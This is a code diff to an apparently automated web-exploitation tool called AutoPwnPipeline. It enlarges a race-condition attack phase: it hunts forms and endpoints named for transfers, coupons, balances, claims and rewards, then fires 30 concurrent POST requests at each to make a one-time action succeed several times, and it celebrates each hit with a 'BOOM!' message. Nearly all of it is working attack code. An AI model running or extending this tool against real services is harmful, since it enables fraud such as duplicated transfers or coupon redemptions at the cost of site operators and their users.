@@ -2765,34 +2765,46 @@ class AutoPwnPipeline:
         targets = []
         for form in self.state.get("forms", []):
             action = form.get("action", "")
-            if action and any(k in action.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload"]):
-                targets.append(action)
+            if action and any(k in action.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload", "claim", "reward"]):
+                inputs = {i.get("name"): "1" for i in form.get("inputs", []) if i.get("name")}
+                targets.append((action, inputs))
         for ep in self.state.get("endpoints", []):
-            if any(k in ep.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload", "api"]):
-                targets.append(urljoin(self.target_url, ep))
+            if any(k in ep.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify", "upload", "api", "claim", "reward"]):
+                targets.append((urljoin(self.target_url, ep), {}))
 
         if not targets:
             return False
 
-        # Send 5 parallel requests to each target and check for multiple successes
+        # Send 30 parallel requests to each target to maximize chance of race condition
         import threading
-        for target in targets[:3]:
+        from concurrent.futures import ThreadPoolExecutor
+        
+        for target_url, target_data in targets[:5]:
             results = []
-            def attack():
+            
+            # Use Narrator to announce
+            self.narrator.speak_thinking(f"Testing TOCTOU Race Condition on {target_url} with 30 concurrent threads...")
+            
+            def attack(_):
                 try:
-                    r = self.session.post(target, data={"amount": "1"}, timeout=5)
-                    results.append(r.status_code)
+                    r = self.session.post(target_url, data=target_data, timeout=5)
+                    return r.status_code
                 except Exception:
-                    pass
-            threads = [threading.Thread(target=attack) for _ in range(5)]
-            for t in threads:
-                t.start()
-            for t in threads:
-                t.join()
-            # If multiple requests succeeded, race condition may be present
-            if len(results) > 1 and all(s == 200 for s in results):
-                print_success(f"  [Race Condition] Multiple successes on {target}: {len(results)}/5 requests returned 200")
-                self._log_step("Phase 4: Race Condition", f"Potential race on {target}", details=f"{len(results)} parallel successes")
+                    return None
+                    
+            with ThreadPoolExecutor(max_workers=30) as pool:
+                results = list(pool.map(attack, range(30)))
+                
+            # Filter valid responses
+            valid_results = [r for r in results if r is not None]
+            
+            # If multiple requests succeeded (e.g. returned 200 OK or 201 Created), race condition may be present
+            # For actions like 'claim', normally only 1 should succeed.
+            success_count = sum(1 for s in valid_results if s in [200, 201])
+            if success_count > 1:
+                print_success(f"  [Race Condition] Multiple successes on {target_url}: {success_count}/30 requests returned success codes")
+                self._log_step("Phase 4: Race Condition", f"Potential race on {target_url}", details=f"{success_count} parallel successes")
+                self.narrator.speak_success(f"BOOM! Race Condition verified on {target_url} ({success_count} concurrent successes)")
                 success = True
         return success
 
